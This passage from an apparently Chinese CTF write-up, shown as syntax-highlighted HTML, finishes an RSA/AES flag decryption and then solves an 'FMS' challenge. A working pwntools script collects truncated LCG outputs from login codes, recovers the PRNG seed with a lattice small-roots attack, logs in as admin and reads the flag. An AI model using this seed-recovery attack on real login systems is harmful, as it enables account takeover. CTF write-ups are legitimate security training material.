+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=ow>not</span> <span class=n>ns</span> <span class=ow>or</span> <span class=n>ns</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=o>...</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;错误：请在脚本中填入 ns, es, ct 和 d 的实际值。&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># 遍历每一对 (n, e)</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>ns</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>            <span class=n>n</span> <span class=o>=</span> <span class=n>ns</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=n>e</span> <span class=o>=</span> <span class=n>es</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;正在分解 n</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>n</span><span class=si>}</span><span class=s2> ...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>factors</span> <span class=o>=</span> <span class=n>find_all_factors</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>d</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            
+</span></span><span class=line><span class=cl>            <span class=c1># 你的代码显示 n = p*q*r</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nb>set</span><span class=p>(</span><span class=n>factors</span><span class=p>))</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span> <span class=c1># 使用 set 来处理分解出相同因子的情况</span>
+</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>,</span> <span class=n>q</span><span class=p>,</span> <span class=n>r</span> <span class=o>=</span> <span class=n>factors</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;找到因子: </span><span class=si>{</span><span class=n>p</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=n>q</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=n>r</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=n>all_ps_tuples</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>p</span><span class=p>,</span> <span class=n>q</span><span class=p>,</span> <span class=n>r</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>                <span class=n>total_sum_of_primes</span> <span class=o>+=</span> <span class=p>(</span><span class=n>p</span> <span class=o>+</span> <span class=n>q</span> <span class=o>+</span> <span class=n>r</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;所有素因子的总和: </span><span class=si>{</span><span class=n>total_sum_of_primes</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>key</span> <span class=o>=</span> <span class=n>SHA3_512</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>total_sum_of_primes</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>digest</span><span class=p>()[:</span><span class=mi>16</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;计算得到的 AES 密钥 (hex): </span><span class=si>{</span><span class=n>key</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>flag_padded</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>ct</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>=</span> <span class=n>unpad</span><span class=p>(</span><span class=n>flag_padded</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>===================================&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;解密成功! Flag: </span><span class=si>{</span><span class=n>flag</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;===================================&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=c1>#flag{9b31dd3e-aa6a-4c4d-b796-bff4e4dfe0cc}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=fms>FMS</h2><p>粗略阅读代码可以知道<code>admin</code>用户的密码是由<code>PRNG</code>类对象<code>prng</code>的<code>choices</code>方法生成的，所以如果我们要获得密码的话只能先知道<code>prng</code>的种子是什么，观察代码中的<code>PRNG</code>类:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>class</span> <span class=nc>PRNG</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>a</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>b</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>p</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>seed</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span> <span class=o>=</span> <span class=n>p</span> <span class=k>if</span> <span class=n>p</span> <span class=k>else</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>128</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>a</span> <span class=o>=</span> <span class=n>a</span> <span class=k>if</span> <span class=n>a</span> <span class=k>else</span> <span class=n>randrange</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>b</span> <span class=o>=</span> <span class=n>b</span> <span class=k>if</span> <span class=n>b</span> <span class=k>else</span> <span class=n>randrange</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>state</span> <span class=o>=</span> <span class=n>seed</span> <span class=k>if</span> <span class=n>seed</span> <span class=k>else</span> <span class=n>randrange</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>next</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>state</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>a</span> <span class=o>*</span> <span class=bp>self</span><span class=o>.</span><span class=n>state</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=p>)</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>state</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>randbytes</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>out</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>out</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=bp>self</span><span class=o>.</span><span class=n>next</span><span class=p>()</span> <span class=o>%</span> <span class=mi>256</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>out</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>choices</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>seq</span><span class=p>,</span> <span class=n>k</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>[</span><span class=n>seq</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>next</span><span class=p>()</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>seq</span><span class=p>)]</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>k</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>getPrime</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>num</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>randbytes</span><span class=p>(</span><span class=n>n</span> <span class=o>//</span> <span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>p</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>num</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=n>n</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>|</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>isPrime</span><span class=p>(</span><span class=n>p</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>p</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>getrandbits</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>num</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>randbytes</span><span class=p>((</span><span class=n>n</span> <span class=o>+</span> <span class=mi>7</span><span class=p>)</span> <span class=o>//</span> <span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>num</span><span class=p>)</span> <span class=o>&amp;</span> <span class=p>((</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>n</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__repr__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s1>&#39;a = </span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=si>}</span><span class=se>\n</span><span class=s1>b = </span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=si>}</span><span class=se>\n</span><span class=s1>p = </span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=si>}</span><span class=s1>&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>很显然可以知道，所有方法几乎都是围绕着 <code>randbytes</code> 实现的，而 <code>randbytes</code> 中每个字节的生成实际上是一个这样的递推关系：
+$$Y_{n+1} = [(aX_n + b) \mod p] \mod 256$$
+其中 $Y_{n+1}$ 是 <code>randbytes</code> 的输出，$X_n$ 是PRNG内部状态，很明显，这是Truncated LCG (截断线性同余生成器)，根据同余性质实际上有：$$X_n = Y_n + 256k_n$$
+所以上述递推式实际上等价于：$$Y_{n+1} + 256k_{n+1} \equiv a(Y_n + 256k_n) + b \pmod{p}$$
+因为 $a, b$ 都会给出，所以我们如果可以收集到足够多的样本 $Y_n$ 应该有可能通过构造格 (Lattice) 或者通过一种类似求小根的方式恢复出所有 $X_n = Y_n + 256k_n$。</p><p>观察代码可以看到，每次登录的时候系统都会调用 <code>prng.randbytes(4)</code> 生成四个随机字节。如果我们连续登录 $n$ 次的话就可以获得 $4n$ 个 prng 的截断输出。</p><p>从而尝试使用 CVP（最近向量问题）相关的格攻击解方程组：</p><p>$$ Y_{n+1} + 256k_{n+1} \equiv a(Y_n + 256k_n) + b \pmod{p} $$</p><p>得到 $k_n$，从而恢复出 seed，这样就可以恢复出 admin 的密码了。与此同时，因为我们恢复了 prng，所以加密 flag 用的 key 和 iv 也就搞到了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>string</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sage.all</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>cuso</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>main</span> <span class=kn>import</span> <span class=n>PRNG</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-fc3efcd9ef.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># menu = &#34;&#34;&#34;Flag Management System</span>
+</span></span><span class=line><span class=cl><span class=c1># [L]ogin</span>
+</span></span><span class=line><span class=cl><span class=c1># [G]et Public Key</span>
+</span></span><span class=line><span class=cl><span class=c1># [R]ead Flag</span>
+</span></span><span class=line><span class=cl><span class=c1># [E]xit&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 获得公钥</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;G&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;=&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;=&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;=&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getVerify</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;code:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Y</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;L&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>verify</span> <span class=o>=</span> <span class=n>getVerify</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>Y</span> <span class=o>+=</span> <span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>verify</span><span class=p>[</span><span class=n>i</span><span class=p>:</span> <span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>2</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Username:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;114514&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Password:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;1919810&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;code:&#39;</span><span class=p>,</span> <span class=n>verify</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>k</span> <span class=o>=</span> <span class=p>[</span><span class=n>var</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;k</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>Y</span><span class=p>))]</span>
+</span></span><span class=line><span class=cl><span class=n>roots</span> <span class=o>=</span> <span class=n>cuso</span><span class=o>.</span><span class=n>find_small_roots</span><span class=p>(</span><span class=n>relations</span><span class=o>=</span><span class=p>[</span><span class=n>a</span> <span class=o>*</span> <span class=p>(</span><span class=n>Y</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=mi>256</span> <span class=o>*</span> <span class=n>k</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>+</span> <span class=n>b</span> <span class=o>-</span> <span class=p>(</span><span class=n>Y</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>256</span> <span class=o>*</span> <span class=n>k</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>])</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>Y</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)],</span> 
+</span></span><span class=line><span class=cl>                              <span class=n>bounds</span><span class=o>=</span><span class=p>{</span><span class=n>k</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=o>**</span><span class=mi>120</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>Y</span><span class=p>))},</span> 
+</span></span><span class=line><span class=cl>                              <span class=n>modulus</span><span class=o>=</span><span class=p>[</span><span class=n>p</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>Y</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)])</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>x0</span> <span class=o>=</span> <span class=n>Y</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=mi>256</span> <span class=o>*</span> <span class=n>roots</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=n>k</span><span class=p>[</span><span class=mi>0</span><span class=p>]]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>33</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>x0</span> <span class=o>=</span> <span class=p>(</span><span class=n>x0</span> <span class=o>-</span> <span class=n>b</span><span class=p>)</span> <span class=o>*</span> <span class=nb>pow</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>p</span><span class=p>)</span> <span class=o>%</span> <span class=n>p</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>prng</span> <span class=o>=</span> <span class=n>PRNG</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>p</span><span class=p>,</span> <span class=n>x0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>prng</span><span class=o>.</span><span class=n>choices</span><span class=p>(</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=n>digits</span><span class=p>,</span> <span class=mi>32</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Recovered password: </span><span class=si>{</span><span class=n>password</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;L&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>verify</span> <span class=o>=</span> <span class=n>getVerify</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 登录</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Username:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;admin&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Password:&#39;</span><span class=p>,</span> <span class=n>password</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;code:&#39;</span><span class=p>,</span> <span class=n>verify</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;admin&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 判断种子是否被正确恢复</span>
+</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>prng</span><span class=o>.</span><span class=n>randbytes</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span> <span class=o>==</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>Y</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>prng</span><span class=o>.</span><span class=n>randbytes</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;R&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
